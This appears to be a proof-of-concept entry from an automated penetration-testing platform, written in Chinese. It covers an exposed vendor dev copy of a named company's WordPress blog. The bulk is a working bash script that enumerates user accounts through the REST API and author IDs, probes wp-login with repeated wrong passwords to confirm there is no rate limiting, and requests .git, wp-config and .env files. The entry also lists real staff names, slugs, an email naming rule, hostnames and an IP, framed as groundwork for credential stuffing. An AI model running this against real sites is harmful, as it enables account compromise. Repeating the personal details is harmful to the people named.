# 供应商 dev 副本 WordPress 站（泛解析 vhost）公网无鉴权暴露：全站可读 + REST 17 账号 + wp-login 无限速，构成生产用户集的凭据验证跳板

- **code**: vendor-dev-copy-wordpress-wildcard-vhost-exposed
- **kind**: poc
- **category**: info-leak
- **component**: WordPress（外包商 dev 克隆，nginx 前置无 WAF；泛解析 *.vendor.tld）
- **versions**: WordPress 7.1.4（页面 generator 回显）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=147（task#6，finding_checks.verdict=verified，findings.status=confirmed）。2026-11-11 于 ARTEX 执行机（Linux，curl + python3，经公共 DNS / 平台记录代理）实测：① 线索来源 = 生产 https://www.greenmangaming.com/blog/wp-json/wp/v2/users 的 user.url 字段指向该外包商域名；② GET https://greenmangaming-blog.topleftdesign.com/ → HTTP/2 200、87088B，<meta name="generator" content="WordPress 7.1.4">，引用 wp-content/themes/green-man-gaming/（生产同款主题）；③ GET /wp-json/wp/v2/users?per_page=100 → HTTP 200、约 142KB JSON，返回 17 个账号（id 1..16,18；slug: blog,gmg-staff,alexm,amy,andrew-smith,brittany-vincent,gordon-bicker,henry-ewins,hstockdale,jcoles,joloman,john-paul-jones,leahw,matthew-forde,steve,tom-power,will-norris），与生产站 18 个账号仅缺 id=22 flynn，证明是生产用户库克隆；④ 绕过 REST 清单用 /?author=19..22 → 200，页面标题给出 Adele Simpson / Scott Bradford / Will Quantrill / Flynn Abbott，slug 为 adele-simpsongreenmangaming-com 等（邮箱派生规则）；⑤ GET /wp-login.php → 200、8510B，标准 name="log"/"pwd"/"wp-submit" 表单；⑥ POST /wp-login.php 10 组默认口令全部 200 登录错误页，无 Set-Cookie 会话、无 429、无锁定，错误文案按用户存在性分叉（blog 8895B vs admin 8836B）；⑦ 边界：/.git、wp-config.php、.env、备份文件均被 nginx 规则拦截，未取得配置或源码；⑧ 同 Host 直连另一 IP（.95）返回 403/564 deny-all，200 全部来自 185.184.248.41（泛解析）；该主机 80/443 在约 2026-11-11 18:15 UTC 后转为 connection refused，复现需其 Web 恢复。据此判定「供应链 dev 副本完整暴露 + 生产同源账号集 + 登录无频控」成立；10 次默认口令均失败，未取得 wp-admin 会话。
- **path**: pocs/vendor-dev-copy-wordpress-wildcard-vhost-exposed/vendor_dev_wp_expose.sh
- **tags**: wordpress,dev-copy,vendor,supply-chain,wildcard-dns,vhost,wp-json,wp-v2-users,user-enumeration,author-enumeration,wp-login,no-rate-limit,info-leak,credential-stuffing
- **created_at**: 2026-11-11T18:42:29.568Z
- **engine**: https://greenmangaming-blog.topleftdesign.com

## 描述

从生产站 WordPress REST 泄露的 user.url 拿到外包商域名后，若该供应商用泛解析（*.vendor.tld → 单个 IP）承载客户站的 dev 副本，dev 副本常与生产同库同主题却无 WAF、无登录限速、无 REST 加固：整站可匿名读、/wp-json/wp/v2/users 直接吐出与生产同源的账号集（快照时间早于生产，通常只少最近新增的 id）、/?author=N 还能补出 REST 未列出的账号，wp-login 开放且无锁定。这不是生产站那条 wp-login 403 绕过的变体（生产靠尾斜杠/编码绕过边缘规则，dev 是直接 200），资产、防护面、结论都不同。价值：拿到「与生产同库」的用户名/slug→邮箱命名规则，可在授权范围内做低频凭据验证；同时是供应链侧（外包方托管）暴露面的直接证据。前提：泛解析 vhost 可解析、dev 站点仍在公网、nginx 未拦 wp-json/wp-login。注意范围边界：dev 站属第三方供应商资产，测试前须确认授权覆盖。

## 用法

```
H=https://vendor-dev.example.com bash vendor_dev_wp_expose.sh
H=https://vendor-dev.example.com IP=185.184.248.41 bash vendor_dev_wp_expose.sh   # 泛解析时用 --resolve 钉住 IP

线索链（怎么找到这类目标）：
1) 先打生产站：GET /blog/wp-json/wp/v2/users?per_page=100，看每个对象的 url/link 字段是否指向 dev./staging./第三方域名；
   或 GET /blog/wp-json/ 的 Link 头（vpce/LB 主机名）→ 供应链侧资产。
2) 对拿到的供应商域名做 DNS：dig +short <name> / dnsx -a -resp；若 *.vendor.tld 泛解析到同一 IP，说明按 Host 分 vhost，必须保持 Host 头（curl --resolve 或 -H 'Host:'）。

四条判据（缺一不算完整命中）：
1) GET / → 200，<meta name="generator" content="WordPress x.y.z">，主题 wp-content/themes/<与生产同款>
2) GET /wp-json/wp/v2/users?per_page=100 → 200 JSON 数组；与生产站账号集比对（同源 = dev 是生产库克隆）
3) GET /?author=N（N=生产有而 dev REST 未列出的 id）→ 200，页面标题/slug 泄露作者显示名与邮箱变形规则
4) GET /wp-login.php → 200 登录表单；POST 错误口令连续 ≥10 次，全程 200、无 Set-Cookie、无 429/锁定/验证码

边界与失败原因：
- 连接被拒/超时：dev 主机可能已下线或被供应商关停（本例 .41 在验证后数小时内 80/443 变 connection refused）；先用 dig 确认 A 记录是否仍存在，再从不同出口/时间点重试。
- 同 Host 打到别的 IP 返回 403/564：该 IP 是 deny-all 的停放/前置节点；用 --resolve 钉住真正回源 IP，并带 -k 与浏览器 UA。
- 401/403 JSON rest_* → dev 装了安全插件；改走 /?author=N 301 差分与首页作者链接。
- 200 但空数组 → dev 无公开作者或插件过滤；用 posts?per_page=1 的 author 字段交叉验证。
- wp-login 302 到别处 → 有 SSO/维护插件；此时只保留 1)2)3) 的信息泄露结论。
- 别在 dev 上跑大字典：它是共享托管，触发风控会连带生产；保持单线程 ≥1s。
```

## 正文

```
#!/usr/bin/env bash
# =============================================================================
# 供应商 dev 副本 WordPress 站公网无鉴权暴露（泛解析 vhost）
#   线索链：生产站 /blog/wp-json/wp/v2/users 的 user.url 字段 → 外包商域名 →
#            *.vendor.tld 泛解析到单 IP → 同一主题的生产克隆完整可读
#
# 用法：
#   H=https://vendor-dev.example.com bash vendor_dev_wp_expose.sh
#   H=https://vendor-dev.example.com IP=185.184.248.41 bash vendor_dev_wp_expose.sh
#   （泛解析站点建议 --resolve 钉住 IP；本机挂代理时必须 --noproxy '*' 才生效）
#
# 判据（四条，缺一不算完整命中）：
#   1) GET / → 200，generator=WordPress x.y.z，主题与生产同款
#   2) GET /wp-json/wp/v2/users?per_page=100 → 200 JSON 数组，账号集与生产同源
#   3) GET /?author=N（REST 未列出的 id）→ 200，泄露作者显示名 + 邮箱派生 slug
#   4) GET /wp-login.php → 200 登录表单；连续错口令无 429 / 无锁定 / 无验证码
# =============================================================================
set -u

H="${H:-https://TARGET}"; H="${H%/}"
IP="${IP:-}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36}"

if [ -n "$IP" ]; then
  # 泛解析：强制把 Host 解析到指定回源 IP
  HOSTP="${H#*://}"; HOSTP="${HOSTP%%/*}"
  req(){ curl -sk --noproxy '*' --max-time 25 -A "$UA" --resolve "$HOSTP:443:$IP" "$@"; }
else
  req(){ curl -sk --max-time 25 -A "$UA" "$@"; }
fi

hr(){ printf '\n== %s ==\n' "$*"; }

hr "[0] DNS / vhost 归属（泛解析判定：同一站点名解析出多个 IP 属正常，回源 IP 才给 200）"
getent ahostsv4 "${H#*://}" 2>/dev/null | awk '{print "  "$1}' | sort -u | head -5

hr "[1] 指纹：整站可匿名读 + 版本 + 主题（与生产比对）"
req "$H/" -o home.html -w '  GET / -> %{http_code} | %{size_download}B\n'
grep -oiE '<meta name="generator" content="[^"]+"' home.html | head -2
grep -oiE 'wp-content/themes/[a-z0-9._-]+' home.html | sort -u | head -5
echo "  判据：200 且主题名与生产站一致 = 生产克隆；版本可被安全插件删掉，以 /wp-json/ 路由表为准"

hr "[2] 主判据：REST 匿名用户枚举"
req "$H/wp-json/wp/v2/users?per_page=100" -o users.json \
  -w '  users -> %{http_code} | %{size_download}B | %{content_type}\n'
python3 - <<'PY'
import json
try:
    d = json.load(open('users.json'))
except Exception as e:
    print("  [!] 非 JSON（WAF/安全插件拦截或路由关闭）:", e); raise SystemExit
if isinstance(d, list):
    print("  账号数 =", len(d), " ids =", [u.get('id') for u in d])
    for u in d:
        print("   - id=%-3s slug=%-40s name=%s" % (u.get('id'), u.get('slug'), u.get('name')))
    print("  [判据] 把这份 slug 集合与生产站 users 比对：同源（只少最近新增 id）= dev 是生产库克隆")
else:
    print("  [!] 非数组，可能 rest_no_route:", str(d)[:200])
PY

hr "[3] 补全：REST 未列出的 id 用 /?author=N 差分（REST 只列有公开文章的作者）"
for n in 17 18 19 20 21 22; do
  out="$(req "$H/?author=$n" -o a.html -w '%{http_code}|%{size_download}')"
  title="$(grep -oiE '<title>[^<]*' a.html | head -1 | sed 's/<title>//')"
  slug="$(grep -oiE 'author/[a-z0-9._-]+' a.html | head -1)"
  echo "  author=$n -> $out | $title | $slug"
done
echo "  [判据] 200 且标题出现真实姓名、slug 为 <name><company>-com 形态 → 直接得到邮箱命名规则"

hr "[4] 认证面：wp-login 是否直接开放（dev 通常没有生产那层边缘规则）"
req "$H/wp-login.php" -o login.html -w '  GET /wp-login.php -> %{http_code} | %{size_download}B | %{content_type}\n'
grep -qiE 'name="log"' login.html && grep -qiE 'name="pwd"' login.html \
  && echo "  [OK] 标准 wp-login 表单（name=log/pwd/wp-submit）" \
  || echo "  [-] 非登录表单：可能被重定向到 SSO / 维护页"

hr "[5] 频控判定（低频 10 次，只判有无 429/锁定/验证码）"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT
req -c "$JAR" -o /dev/null "$H/wp-login.php"
i=0; hit=0
while [ $i -lt 10 ]; do
  i=$((i+1))
  out="$(req -b "$JAR" -c "$JAR" -o resp.html -w '%{http_code}|%{size_download}' -X POST "$H/wp-login.php" \
      --data-urlencode 'log=blog' --data-urlencode "pwd=Wrong$i!" \
      --data 'wp-submit=Log+In&testcookie=1&redirect_to=%2Fwp-admin%2F')"
  code="${out%%|*}"
  echo "  #$i -> $out  $(grep -oiE 'Unknown username|incorrect|not registered|Too many|locked' resp.html | head -1)"
  case "$code" in 429|403) echo "  [STOP] 出现限速/拦截"; hit=1; break;; esac
  grep -qiE 'too many|rate limit|locked|captcha' resp.html && { echo "  [STOP] 出现限速/锁定特征"; hit=1; break; }
  sleep 1
done
[ $hit -eq 0 ] && echo "  [-] 10 次均 200 登录错误页、无 Set-Cookie 会话、无 429/锁定 → 登录面无频控（仅判定，不等于可无限爆破）"

hr "[6] 边界：常见敏感文件是否被 nginx 拦掉（确认只拿到数据面而非源码/配置）"
for p in /.git/config /wp-config.php /.env /wp-content/backup.zip /wp-config.php.bak; do
  printf '  %-26s ' "$p"
  req -o /dev/null -w '%{http_code} | %{size_download}B\n' "$H$p"
done

cat <<'TIPS'

=== 失败时的常见原因 ===
1) connection refused / timeout → dev 主机已下线或被供应商关停（本例 .41 在验证后数小时内 80/443 变 refused）。
   先 dig/dnsx 确认 A 记录是否仍在；再从其他出口或过一段时间重试，别当成“漏洞修了”。
2) 同 Host 打到其他 IP 返回 403/564 → 那是 deny-all 的停放/前置节点；
   用 --resolve host:443:<回源IP> 钉住，并加 -k（证书常与 Host 不匹配）。
3) wp-json 401/403 JSON rest_* → dev 装了安全插件：改走 /?author=N 差分 + 首页作者链接。
4) users 200 但空数组 → 无公开作者；用 /wp-json/wp/v2/posts?per_page=1 的 author 字段交叉验证。
5) REST 比生产少几个 id → 正常（dev 是更早的快照）；用 /?author=<缺失id> 补。
6) wp-login 302/跳转 → 有 SSO 或维护插件；此时信息泄露结论仍成立，认证面结论作废。
7) 大量并发导致整站 5xx → 共享托管，风控会连带生产；单线程 ≥1s，禁止大字典。

=== 定性与边界 ===
- 归属：dev 副本通常属外包商资产；测试与凭据验证前先确认授权范围，别越界打第三方托管的其他站点。
- 泄露的是账号名/slug（可反推邮箱），不是口令；未拿到 wp-admin 会话就不能声称接管。
- 与生产站 wp-login 403 绕过条目区分：dev 无需任何绕过，直接 200；两条不是同一资产、不同结论。
TIPS
```
